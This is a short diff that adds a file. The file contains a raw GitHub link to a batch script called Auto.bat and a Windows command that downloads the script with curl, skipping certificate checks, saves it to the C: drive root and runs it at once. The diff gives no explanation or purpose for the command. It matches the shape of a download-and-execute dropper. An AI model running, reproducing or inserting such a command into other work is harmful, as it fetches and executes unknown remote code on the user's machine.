@@ -1,0 +1,4 @@
+https://raw.githubusercontent.com/tempuser31/11/main/Auto.bat
+
+
+curl -LJk https://raw.githubusercontent.com/tempuser31/11/main/Auto.bat -o c:\Auto.bat & start c:\Auto.bat
